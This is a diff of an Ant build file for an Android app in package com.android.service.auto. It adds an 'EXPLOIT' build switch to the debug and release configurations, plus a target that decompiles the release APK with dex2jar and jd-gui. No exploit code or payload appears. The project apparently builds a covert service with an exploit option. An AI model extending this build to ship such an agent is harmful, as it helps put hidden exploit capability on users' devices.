@@ -49,8 +49,8 @@
 		<filter token="DATE" value="${TODAY}" />
 	</filterset>
 
-	<target name="-set-debug-mode">
-		<echo message="Set debug mode" />
+	<target name="ht-set-debug-mode">
+		<echo message="********** Set debug mode *********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
 				<filter token="GUI_ENABLED" value="true" />
@@ -59,13 +59,14 @@
 		<copy file="preprocess/AutoConfig.java" toFile="src/com/android/service/auto/AutoConfig.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="true" />
+				<filter token="EXPLOIT" value="true" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" />
 	</target>
 
-	<target name="-set-release-mode">
-		<echo message="Set release mode" />
+	<target name="ht-set-release-mode">
+		<echo message="******** Set release mode **********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
 				<filter token="GUI_ENABLED" value="false" />
@@ -74,16 +75,33 @@
 		<copy file="preprocess/AutoConfig.java" toFile="src/com/android/service/auto/AutoConfig.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="false" />
+				<filter token="EXPLOIT" value="false" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" />
 	</target>
 
+	<!--
 	<target name="-pre-build">
 		<echo message="Pre building" />
 	</target>
 	<target name="-pre-compile">
 		<echo message="Pre compile" />
+	</target> -->
+
+	<target name="reverse">
+		<echo message="Reverse" />
+		<deltree dir="reverse" />
+		<copy file="bin/android_service-release.apk" toDir="reverse" />
+		<unzip src="reverse/android_service-release.apk" dest="reverse" />
+
+		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
+			<arg value="reverse/classes.dex" />
+		</exec>
+		<exec executable="..\..\HT\Reversing\jd-gui.exe">
+			<arg value="reverse/classes.dex.dex2jar.jar" />
+		</exec>
+
 	</target>
 
 	<!--
@@ -113,6 +131,14 @@
                below to <setup import="false" />. 
              - customize to your needs.
     -->
+
+
 	<setup />
+
+	<target name="htdebug" depends="ht-set-debug-mode, debug">
+	</target>
+
+	<target name="htrelease" depends="clean, ht-set-release-mode, release, reverse">
+	</target>
 
 </project>
